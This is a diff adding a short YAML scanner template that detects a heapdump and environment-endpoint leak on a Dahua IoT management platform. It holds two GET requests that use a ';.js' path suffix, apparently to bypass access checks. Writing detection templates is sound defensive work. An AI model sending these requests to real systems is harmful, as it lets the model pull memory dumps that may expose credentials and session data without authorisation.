@@ -1,0 +1,17 @@
+name: 大华智能物联综合管理平台-heapdump泄露
+description: >-
+  敏感信息
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: "/evo-apigw/dsc-mac/env;.js"
+    expression:
+      status: 200
+      body_all: ["java.version"]
+  - method: GET
+    path: "/evo-apigw/dsc-mac/heapdump;.js"
+    expression:
+      status: 200
+      headers:
+        Content-Type: "application/octet-stream"
